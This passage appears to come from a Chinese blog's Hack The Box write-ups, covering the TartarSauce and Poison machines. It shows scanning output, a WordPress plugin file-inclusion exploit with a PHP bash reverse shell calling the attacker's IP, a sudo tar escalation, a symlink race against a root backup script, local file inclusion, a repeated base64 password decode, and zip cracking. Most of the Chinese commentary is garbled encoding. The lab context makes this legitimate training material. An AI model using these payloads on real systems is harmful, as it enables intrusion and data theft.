- https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/ [+] WordPress readme found: http://10.10.10.88/webservices/wp/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] The external WP-Cron seems to be enabled: http://10.10.10.88/webservices/wp/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-wordpress-from-ddos | - https://github.com/wpscanteam/wpscan/issues/1299 [+] WordPress version 4.9.4 identified (Insecure, released on 2018-02-06). | Found By: Emoji Settings (Passive Detection) | - http://10.10.10.88/webservices/wp/, Match: &#39;wp-includes\\/js\\/wp-emoji-release.min.js?ver=4.9.4&#39; | Confirmed By: Meta Generator (Passive Detection) | - http://10.10.10.88/webservices/wp/, Match: &#39;WordPress 4.9.4&#39; [i] The main theme could not be detected. [+] Enumerating Most Popular Plugins (via Aggressive Methods) Checking Known Locations - Time: 00:00:50 &lt;=================================================================================================================================&gt; (1500 / 1500) 100.00% Time: 00:00:50 [+] Checking Plugin Versions (via Passive and Aggressive Methods) [i] Plugin(s) Identified: [+] akismet | Location: http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/ | Last Updated: 2022-12-01T17:18:00.000Z | Readme: http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/readme.txt | [!] The version is out of date, the latest version is 5.0.2 | | Found By: Known Locations (Aggressive Detection) | - http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/, status: 200 | | Version: 4.0.3 (100% confidence) | Found By: Readme - Stable Tag (Aggressive Detection) | - http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/readme.txt | Confirmed By: Readme - ChangeLog Section (Aggressive Detection) | - http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/readme.txt [+] gwolle-gb | Location: http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/ | Last Updated: 2023-01-24T11:28:00.000Z | Readme: http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt | [!] The version is out of date, the latest version is 4.5.0 | | Found By: Known Locations (Aggressive Detection) | - http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/, status: 200 | | Version: 2.3.10 (100% confidence) | Found By: Readme - Stable Tag (Aggressive Detection) | - http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt | Confirmed By: Readme - ChangeLog Section (Aggressive Detection) | - http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt [!] No WPScan API Token given, as a result vulnerability data has not been output. [!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register [+] Finished: Sat Feb 11 21:10:56 2023 [+] Requests Done: 1511 [+] Cached Requests: 31 [+] Data Sent: 449.789 KB [+] Data Received: 272.615 KB [+] Memory used: 194.531 MB [+] Elapsed time: 00:00:53 å¯ä»¥å¾—çŸ¥ wordpress ç‰ˆæœ¬æ˜¯ 4.9.ï¼Œå¹¶ä¸”æœ‰ä¸€ä¸ª Gwolle æ’ä»¶ï¼Œåˆ‡åœ¨æ’ä»¶çš„ readme é¡µé¢ä¸­æœ‰è¯´æ˜ç‰ˆæœ¬å·ä¸º 1.5.3 https://www.exploit-db.com/exploits/38861 æ ¹æ®æè¿°ï¼Œæ‰¾åˆ°äº†ä¸€ä¸ªæ¼æ´ æ¼æ´åˆ©ç”¨æ ¹æ®æ¼æ´ä¸­çš„æè¿°ï¼Œæˆ‘ä»¬æ¥æ„é€ ä¸€ä¸‹ exploit http://[host]/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://[hackers_website] curl -s http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.16.6/ ä¸Šé¢æ˜¯æˆ‘ä»¬ä¹‹åè¦è¿è¡Œçš„å†…å®¹ &lt;?php exec(&quot;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.16.6/4444 0&gt;&amp;1&#39;&quot;) ?&gt; ä¸Šé¢æ˜¯æˆ‘ä»¬çš„ exploit è¯·æ±‚çš„ shell æ–‡ä»¶çš„å†…å®¹ï¼Œæ–‡ä»¶åå­—ä¸º wp-load.php â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop] â””â”€# python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... æ¥ç€ä½¿ç”¨ python3 è¿è¡Œä¸€ä¸ª http æœåŠ¡å™¨ nc -nvlp 4444 æ¥ç€ä½¿ç”¨ nc ç›‘å¬ä¸€ä¸ªç«¯å£ æœ€åå»æ‰§è¡Œæˆ‘ä»¬çš„ exploit â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop] â””â”€# rlwrap nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.16.6] from (UNKNOWN) [10.10.10.88] 33670 bash: cannot set terminal process group (1261): Inappropriate ioctl for device bash: no job control in this shell &lt;/wp/wp-content/plugins/gwolle-gb/frontend/captcha$ whoami&amp;&amp;id whoami&amp;&amp;id www-data uid=33(www-data) gid=33(www-data) groups=33(www-data) æˆåŠŸè¿”å› shell æƒé™æå‡User&lt;/wp/wp-content/plugins/gwolle-gb/frontend/captcha$ sudo -l sudo -l Matching Defaults entries for www-data on TartarSauce: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User www-data may run the following commands on TartarSauce: (onuma) NOPASSWD: /bin/tar ä½¿ç”¨ sudo -l å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ onuma æƒé™æ‰§è¡Œ /bin/tar https://gtfobins.github.io/gtfobins/tar/ sudo -u onuma /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh whoami&amp;&amp;id onuma uid=1000(onuma) gid=1000(onuma) groups=1000(onuma),24(cdrom),30(dip),46(plugdev) æˆåŠŸææƒåˆ° user æƒé™ cat user.txt 140682a65dccf6fbd674edb57692ae4c æˆåŠŸæ‹¿åˆ° user æƒé™çš„ flag æ–‡ä»¶ Root2023/02/11 08:40:29 CMD: UID=0 PID=3580 | /bin/bash /usr/sbin/backuperer è¿è¡Œ pspy å¯ä»¥çœ‹åˆ°ï¼Œä¼šå®šæ—¶ä»¥ root æƒé™æ‰§è¡Œ &#x2F;usr&#x2F;sbin&#x2F;backuperer è¿™ä¸ªæ–‡ä»¶ï¼Œå»æŸ¥çœ‹ä¸€ä¸‹ file /usr/sbin/backuperer /usr/sbin/backuperer: Bourne-Again shell script, UTF-8 Unicode text executable cat /usr/sbin/backuperer #!/bin/bash #------------------------------------------------------------------------------------- # backuperer ver 1.0.2 - by ÈœÓÅ—gÍ·Í¼Èœ # ONUMA Dev auto backup program # This tool will keep our webapp backed up incase another skiddie defaces us again. # We will be able to quickly restore from a backup in seconds ;P #------------------------------------------------------------------------------------- # Set Vars Here basedir=/var/www/html bkpdir=/var/backups tmpdir=/var/tmp testmsg=$bkpdir/onuma_backup_test.txt errormsg=$bkpdir/onuma_backup_error.txt tmpfile=$tmpdir/.$(/usr/bin/head -c100 /dev/urandom |sha1sum|cut -d&#39; &#39; -f1) check=$tmpdir/check # formatting printbdr() { for n in $(seq 72); do /usr/bin/printf $&quot;-&quot;; done } bdr=$(printbdr) # Added a test file to let us see when the last backup was run /usr/bin/printf $&quot;$bdr\\nAuto backup backuperer backup last ran at : $(/bin/date)\\n$bdr\\n&quot; &gt; $testmsg # Cleanup from last time. /bin/rm -rf $tmpdir/.* $check # Backup onuma website dev files. /usr/bin/sudo -u onuma /bin/tar -zcvf $tmpfile $basedir &amp; # Added delay to wait for backup to complete if large files get added. /bin/sleep 30 # Test the backup integrity integrity_chk() { /usr/bin/diff -r $basedir $check$basedir } /bin/mkdir $check /bin/tar -zxvf $tmpfile -C $check if [[ $(integrity_chk) ]] then # Report errors so the dev can investigate the issue. /usr/bin/printf $&quot;$bdr\\nIntegrity Check Error in backup last ran : $(/bin/date)\\n$bdr\\n$tmpfile\\n&quot; &gt;&gt; $errormsg integrity_chk &gt;&gt; $errormsg exit 2 else # Clean up and save archive to the bkpdir. /bin/mv $tmpfile $bkpdir/onuma-www-dev.bak /bin/rm -rf $check .* exit 0 fi è„šæœ¬åˆ†æç”Ÿæˆå·¥ä½œç›®å½•å’Œéšæœºä¸´æ—¶æ–‡ä»¶å æ‰“å°æ ‡é¢˜ ç”Ÿæˆæµ‹è¯•æ¶ˆæ¯ æ¸…ç† å°†ç”¨æˆ·ä¸Šä¸‹æ–‡æ›´æ”¹ä¸º onuma å¹¶å°† /var/www/html å¤‡ä»½åˆ°ä¸´æ—¶æ–‡ä»¶ä¸­ ç¡ 30 ç§’ åˆ›å»ºç”¨äºå®Œæ•´æ€§æ£€æŸ¥çš„ç›®å½• unatar æ–°å»ºæ–‡ä»¶åˆ°checkç›®å½• æ‰§è¡Œ diff ä»¥æ£€æŸ¥å­˜æ¡£å’Œæ–‡ä»¶ç³»ç»Ÿä¹‹é—´çš„å·®å¼‚ å¦‚æœæ²¡æœ‰å·®å¼‚æ¸…ç†å¹¶ä¿å­˜æ–°åˆ›å»ºçš„å­˜æ¡£ï¼Œå¤‡ä»½æ—§çš„ å¦åˆ™å°†æ‰€æœ‰å·®å¼‚è®°å½•åˆ°æ—¥å¿—æ–‡ä»¶ åˆ©ç”¨ä½¿ç”¨ www-data ç”¨æˆ·åœ¨ &#x2F;var&#x2F;www&#x2F;html ä¸‹åˆ›å»ºç©ºæ–‡ä»¶ &lt;/wp/wp-content/plugins/gwolle-gb/frontend/captcha$ cd /var/www/html cd /var/www/html www-data@TartarSauce:/var/www/html$ id id uid=33(www-data) gid=33(www-data) groups=33(www-data) www-data@TartarSauce:/var/www/html$ touch 1 touch 1 ä½¿ç”¨ onuma ç”¨æˆ·åœ¨ &#x2F;var&#x2F;tmp ä¸‹åˆ›å»º var&#x2F;www&#x2F;html&#x2F; ç»“æ„ï¼Œå°† &#x2F;root&#x2F;root.txt é“¾æ¥åˆ° 1 cd /var/tmp pwd /var/tmp id uid=1000(onuma) gid=1000(onuma) groups=1000(onuma),24(cdrom),30(dip),46(plugdev) mkdir -p var/www/html cd var/www/html ln -s /root/root.txt 1 ls -la total 8 drwxr-xr-x 2 onuma onuma 4096 Feb 11 09:06 . drwxr-xr-x 3 onuma onuma 4096 Feb 11 09:05 .. lrwxrwxrwx 1 onuma onuma 14 Feb 11 09:06 1 -&gt; /root/root.txt åœ¨ &#x2F;var&#x2F;tmp ä¸­åˆ›å»º tar å­˜æ¡£ cd /var/tmp /bin/tar -zcvf a.tgz var/www/html var/www/html/ var/www/html/1 ç­‰å¾…è„šæœ¬æ‰§è¡Œï¼Œå¹¶åœ¨ 30 ç§’å†…å°† a.tgz å¤åˆ¶åˆ°ä¸´æ—¶å­˜æ¡£ ls -la total 112 drwxrwxrwt 11 root root 4096 Feb 11 09:10 . drwxr-xr-x 14 root root 4096 May 12 2022 .. -rw-r--r-- 1 onuma onuma 65536 Feb 11 09:10 .816e92e4f61e2b8dce68f5779ed42ad70a562348 -rw-r--r-- 1 onuma onuma 154 Feb 11 09:08 a.tgz drwxr-xr-x 3 onuma onuma 4096 Feb 11 09:05 var cp a.tgz .816e92e4f61e2b8dce68f5779ed42ad70a562348 ç­‰å¾…æ£€æŸ¥å®Œæˆ æ£€æŸ¥ &#x2F;var&#x2F;backups ä¸‹çš„æ—¥å¿—æ–‡ä»¶ onuma_backup_error.txtï¼Œå› ä¸ºå®ƒå°†åŒ…å«æ¥è‡ª &#x2F;var&#x2F;www&#x2F;html å’Œ a.tgz å­˜æ¡£çš„æ–‡ä»¶ä¹‹é—´çš„æŸ¥æ„ï¼Œå³ &#x2F;root&#x2F;root.txt çš„å†…å®¹ cat /var/backups/onuma_backup_error.txt ... ------------------------------------------------------------------------ Integrity Check Error in backup last ran : Thu Jan 21 05:38:54 EST 2021 ------------------------------------------------------------------------ /var/tmp/.379fe8e77f9f84a66b9a6df9a452d10499713829 Binary files /var/www/html/webservices/wp/.wp-config.php.swp and /var/tmp/check/var/www/html/webservices/wp/.wp-config.php.swp differ ------------------------------------------------------------------------ Integrity Check Error in backup last ran : Sat Feb 11 09:11:14 EST 2023 ------------------------------------------------------------------------ /var/tmp/.816e92e4f61e2b8dce68f5779ed42ad70a562348 diff -r /var/www/html/1 /var/tmp/check/var/www/html/1 0a1 &gt; 2066572c29f0ffd2a77ee5e5c2e77703 æˆåŠŸæ‹¿åˆ° root æƒé™çš„ flag æ–‡ä»¶","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Poison - Hackthebox","slug":"Hackthebox - Poison","date":"2023-02-08T11:38:36.000Z","updated":"2023-05-20T02:44:36.000Z","comments":true,"path":"2023/02/08/Hackthebox - Poison/","link":"","permalink":"http://www.lucifiel.com/2023/02/08/Hackthebox%20-%20Poison/","excerpt":"","text":"Hackthebox - Poisoné¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æ”¶é›†Nmapâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop] â””â”€# nmap -sS -A -sC -sV -p- --min-rate 10000 10.10.10.84 Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-08 18:38 CST Warning: 10.10.10.84 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.84 Host is up (0.078s latency). Not shown: 52168 filtered tcp ports (no-response), 13365 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0) | ssh-hostkey: | 2048 e33b7d3c8f4b8cf9cd7fd23ace2dffbb (RSA) | 256 4ce8c602bdfc83ffc98001547d228172 (ECDSA) |_ 256 0b8fd57185901385618beb34135f943b (ED25519) 80/tcp open http Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32) |_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8). |_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32 No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.93%E=4%D=2/8%OT=22%CT=8%CU=32827%PV=Y%DS=2%DC=T%G=Y%TM=63E37C05 OS:%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10D%TI=Z%CI=Z%II=RI%TS=20)OP OS:S(O1=M537NW6ST11%O2=M537NW6ST11%O3=M280NW6NNT11%O4=M537NW6ST11%O5=M218NW OS:6ST11%O6=M109ST11)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFFF)EC OS:N(R=Y%DF=Y%T=40%W=FFFF%O=M537NW6SLL%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F= OS:AS%RD=0%Q=)T2(R=N)T3(R=Y%DF=Y%T=40%W=FFFF%S=O%A=S+%F=AS%O=M109NW6ST11%RD OS:=0%Q=)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S OS:=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=38%UN=0%R OS:IPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=S%T=40%CD=S) Network Distance: 2 hops Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd TRACEROUTE (using port 1720/tcp) HOP RTT ADDRESS 1 122.13 ms 10.10.16.1 2 77.21 ms 10.10.10.84 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 89.22 seconds Http ä¼¼ä¹æ˜¯ä¸€ä¸ªæœ¬åœ°è„šæœ¬åŠ è½½çš„ä¸€ä¸ªç¨‹åºï¼ŒæŒ¨ä¸ªçœ‹ä¸€ä¸‹æ˜¯å¦æœ‰ä»€ä¹ˆå¯ç”¨çš„ä¸œè¥¿ â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop] â””â”€# curl http://10.10.10.84/browse.php?file=listfiles.php Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; browse.php [3] =&gt; index.php [4] =&gt; info.php [5] =&gt; ini.php [6] =&gt; listfiles.php [7] =&gt; phpinfo.php [8] =&gt; pwdbackup.txt ) æ¼æ´åˆ©ç”¨æœ‰ç‚¹ä¸œè¥¿ï¼Œè¿™æ˜¯åˆ—å‡ºäº†ä¸€ä¸ªåˆ—è¡¨å§ï¼Œç„¶åçœ‹åˆ°æ–‡ä»¶ç»“æ„ï¼Œçªç„¶æƒ³åˆ°æ˜¯å¦ä¼šæœ‰ LFI å‘¢ï¼Ÿå°è¯•ä¸€ä¸‹ â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop] â””â”€# curl http://10.10.10.84/browse.php?file=/etc/passwd # $FreeBSD: releng/11.1/etc/master.passwd 299365 2016-05-10 12:47:36Z bcr $ # root:*:0:0:Charlie &amp;:/root:/bin/csh toor:*:0:0:Bourne-again Superuser:/root: daemon:*:1:1:Owner of many system processes:/root:/usr/sbin/nologin operator:*:2:5:System &amp;:/:/usr/sbin/nologin bin:*:3:7:Binaries Commands and Source:/:/usr/sbin/nologin tty:*:4:65533:Tty Sandbox:/:/usr/sbin/nologin kmem:*:5:65533:KMem Sandbox:/:/usr/sbin/nologin games:*:7:13:Games pseudo-user:/:/usr/sbin/nologin news:*:8:8:News Subsystem:/:/usr/sbin/nologin man:*:9:9:Mister Man Pages:/usr/share/man:/usr/sbin/nologin sshd:*:22:22:Secure Shell Daemon:/var/empty:/usr/sbin/nologin smmsp:*:25:25:Sendmail Submission User:/var/spool/clientmqueue:/usr/sbin/nologin mailnull:*:26:26:Sendmail Default User:/var/spool/mqueue:/usr/sbin/nologin bind:*:53:53:Bind Sandbox:/:/usr/sbin/nologin unbound:*:59:59:Unbound DNS Resolver:/var/unbound:/usr/sbin/nologin proxy:*:62:62:Packet Filter pseudo-user:/nonexistent:/usr/sbin/nologin _pflogd:*:64:64:pflogd privsep user:/var/empty:/usr/sbin/nologin _dhcp:*:65:65:dhcp programs:/var/empty:/usr/sbin/nologin uucp:*:66:66:UUCP pseudo-user:/var/spool/uucppublic:/usr/local/libexec/uucp/uucico pop:*:68:6:Post Office Owner:/nonexistent:/usr/sbin/nologin auditdistd:*:78:77:Auditdistd unprivileged user:/var/empty:/usr/sbin/nologin www:*:80:80:World Wide Web Owner:/nonexistent:/usr/sbin/nologin _ypldap:*:160:160:YP LDAP unprivileged user:/var/empty:/usr/sbin/nologin hast:*:845:845:HAST unprivileged user:/var/empty:/usr/sbin/nologin nobody:*:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin _tss:*:601:601:TrouSerS user:/var/empty:/usr/sbin/nologin messagebus:*:556:556:D-BUS Daemon User:/nonexistent:/usr/sbin/nologin avahi:*:558:558:Avahi Daemon User:/nonexistent:/usr/sbin/nologin cups:*:193:193:Cups Owner:/nonexistent:/usr/sbin/nologin charix:*:1001:1001:charix:/home/charix:/bin/csh niceï¼Œå­˜åœ¨ LFI æ¼æ´ï¼Œç­›é€‰ä¸€ä¸‹å¯ç”¨è´¦æˆ·å…ˆ â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop] â””â”€# curl http://10.10.10.84/browse.php?file=../../../../../etc/passwd|grep &quot;/bin/csh&quot; % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 1894 100 1894 0 0 11999 0 --:--:-- --:--:-- --:--:-- 12063 root:*:0:0:Charlie &amp;:/root:/bin/csh charix:*:1001:1001:charix:/home/charix:/bin/csh å‘ç°å¯ä»¥ä½¿ç”¨ bash æƒé™çš„ç”¨æˆ·å°±ä¸¤ä¸ªï¼Œä¸€ä¸ªæ˜¯ rootï¼Œä¸€ä¸ªæ˜¯ charixï¼Œå’±ä»¬è‚¯å®šä¸å¯èƒ½ç›´æ¥åˆ° root å§ï¼Ÿé‚£æˆ‘ä»¬å°±è‚¯å®šæ˜¯è¦æ‰¾ charix çš„çªç ´ç‚¹äº† â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop] â””â”€# curl http://10.10.10.84/browse.php?file=pwdbackup.txt This password is secure, it&#39;s encoded atleast 13 times.. what could go wrong really.. Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU bGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS bVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW M040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs WmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy eG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G WkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw MXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa T1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k WFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk WGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0 NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT Vm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz WkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW VmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO Ukd4RVdub3dPVU5uUFQwSwo= æœ‰ä¸€æ®µ base64ï¼Œè§£å¯†ä¸€ä¸‹çœ‹çœ‹ This password is secure, it&#39;s encoded atleast 13 times.. what could go wrong really.. è¿™ä¸ªå¯†ç æ˜¯å®‰å…¨çš„ï¼Œå®ƒè‡³å°‘è¢«ç¼–è¯‘äº† 13 æ¬¡...çœŸçš„ä¼šå‡ºä»€ä¹ˆé—®é¢˜... è¿™ä»–å–µçš„å±…ç„¶å¾—è§£å¯† 13 æ¬¡ï¼ŒçœŸéº»çƒ¦ â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop] â””â”€# echo &quot;Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU bGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS bVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW M040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs WmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy eG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G WkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw MXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa T1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k WFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk WGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0 NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT Vm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz WkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW VmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO Ukd4RVdub3dPVU5uUFQwSwo=&quot;|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d|base64 -d Charix!2#4%6&amp;8(0 æœ€åå¾—åˆ°äº†ä¸€ä¸ªå¯†ç ï¼Œå»å°è¯•æ˜¯å¦å¯ä»¥ç™»å½• ssh â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop] â””â”€# ssh charix@10.10.10.84 The authenticity of host &#39;10.10.10.84 (10.10.10.84)&#39; can&#39;t be established. ED25519 key fingerprint is SHA256:ai75ITo2ASaXyYZVscbEWVbDkh/ev+ClcQsgC6xmlrA. This key is not known by any other names Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added &#39;10.10.10.84&#39; (ED25519) to the list of known hosts. (charix@10.10.10.84) Password for charix@Poison: Last login: Mon Mar 19 16:38:00 2018 from 10.10.14.4 FreeBSD 11.1-RELEASE (GENERIC) #0 r321309: Fri Jul 21 02:08:28 UTC 2017 Welcome to FreeBSD! Release Notes, Errata: https://www.FreeBSD.org/releases/ Security Advisories: https://www.FreeBSD.org/security/ FreeBSD Handbook: https://www.FreeBSD.org/handbook/ FreeBSD FAQ: https://www.FreeBSD.org/faq/ Questions List: https://lists.FreeBSD.org/mailman/listinfo/freebsd-questions/ FreeBSD Forums: https://forums.FreeBSD.org/ Documents installed with the system are in the /usr/local/share/doc/freebsd/ directory, or can be installed later with: pkg install en-freebsd-doc For other languages, replace &quot;en&quot; with a language code like de or fr. Show the version of FreeBSD installed: freebsd-version ; uname -a Please include that output and any error messages when posting questions. Introduction to manual pages: man man FreeBSD directory layout: man hier Edit /etc/motd to change this login announcement. If you want to play CDs with FreeBSD, a utility for this is already included. Type &#39;cdcontrol&#39; then &#39;help&#39; to learn more. (You may need to set the CDROM environment variable in order to make cdcontrol want to start.) charix@Poison:~ % whoami&amp;&amp;id charix uid=1001(charix) gid=1001(charix) groups=1001(charix) æˆåŠŸç™»å½• ssh charix@Poison:~ % cat user.txt eaacdfb2d141b72a589233063604209c æˆåŠŸæ‹¿åˆ° user æƒé™çš„ flag æ–‡ä»¶ æƒé™æå‡charix@Poison:~ % ls secret.zip user.txt charix@Poison:~ % ls -la total 48 drwxr-x--- 2 charix charix 512 Mar 19 2018 . drwxr-xr-x 3 root wheel 512 Mar 19 2018 .. -rw-r----- 1 charix charix 1041 Mar 19 2018 .cshrc -rw-rw---- 1 charix charix 0 Mar 19 2018 .history -rw-r----- 1 charix charix 254 Mar 19 2018 .login -rw-r----- 1 charix charix 163 Mar 19 2018 .login_conf -rw-r----- 1 charix charix 379 Mar 19 2018 .mail_aliases -rw-r----- 1 charix charix 336 Mar 19 2018 .mailrc -rw-r----- 1 charix charix 802 Mar 19 2018 .profile -rw-r----- 1 charix charix 281 Mar 19 2018 .rhosts -rw-r----- 1 charix charix 849 Mar 19 2018 .shrc -rw-r----- 1 root charix 166 Mar 19 2018 secret.zip -rw-r----- 1 root charix 33 Mar 19 2018 user.txt è¿™é‡Œæœ‰ä¸€ä¸ª secret.zip çš„æ–‡ä»¶ï¼Œä¸‹è½½ä¸‹æ¥çœ‹çœ‹ â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop] â””â”€# scp charix@10.10.10.84:/home/charix/secret.zip ./ (charix@10.10.10.84) Password for charix@Poison: secret.zip â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop] â””â”€# file secret.zip secret.zip: Zip archive data, at least v2.0 to extract, compression method=store ç¡®å®æ˜¯ zip ç±»å‹çš„ â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop] â””â”€# unzip secret.zip Archive: secret.zip [secret.zip] secret password: ä½†æ˜¯éœ€è¦ä¸€ä¸ªè§£å‹å¯†ç ï¼Œå»ç ´è§£ä¸€ä¸‹ â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop] â””â”€# zip2john secret.zip &gt; hash ver 2.0 secret.zip/secret PKZIP Encr: cmplen=20, decmplen=8, crc=77537827 ts=9827 cs=7753 type=0 â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop] â””â”€# john 